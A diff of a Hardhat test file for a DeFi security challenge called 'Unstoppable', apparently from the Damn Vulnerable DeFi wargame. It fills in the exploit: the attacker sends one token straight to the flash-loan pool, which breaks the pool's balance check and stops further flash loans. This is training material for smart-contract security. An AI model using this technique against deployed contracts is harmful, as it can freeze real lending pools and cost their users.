@@ -1,14 +1,14 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 
-describe('[Challenge] Unstoppable', function () {
+describe('[Challenge] Unstoppable', function() {
     let deployer, attacker, someUser;
 
     // Pool has 1M * 10**18 tokens
     const TOKENS_IN_POOL = ethers.utils.parseEther('1000000');
     const INITIAL_ATTACKER_TOKEN_BALANCE = ethers.utils.parseEther('100');
 
-    before(async function () {
+    before(async function() {
         /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
 
         [deployer, attacker, someUser] = await ethers.getSigners();
@@ -32,17 +32,22 @@ describe('[Challenge] Unstoppable', function () {
             await this.token.balanceOf(attacker.address)
         ).to.equal(INITIAL_ATTACKER_TOKEN_BALANCE);
 
-         // Show it's possible for someUser to take out a flash loan
-         const ReceiverContractFactory = await ethers.getContractFactory('ReceiverUnstoppable', someUser);
-         this.receiverContract = await ReceiverContractFactory.deploy(this.pool.address);
-         await this.receiverContract.executeFlashLoan(10);
+        // Show it's possible for someUser to take out a flash loan
+        const ReceiverContractFactory = await ethers.getContractFactory('ReceiverUnstoppable', someUser);
+        this.receiverContract = await ReceiverContractFactory.deploy(this.pool.address);
+        await this.receiverContract.executeFlashLoan(10);
     });
 
-    it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+    it('Exploit', async function() {
+        const one = ethers.utils.parseEther('1');
+        // const attackerDamnValuableToken = new ethers.Contract(this.token.address, this.token.interface, attacker);
+        // await attackerDamnValuableToken.transfer(this.pool.address, one);
+
+        // const attackerDamnValuableToken = this.token.connect(attacker);
+        await this.token.connect(attacker).transfer(this.pool.address, one);
     });
 
-    after(async function () {
+    after(async function() {
         /** SUCCESS CONDITIONS */
 
         // It is no longer possible to execute flash loans
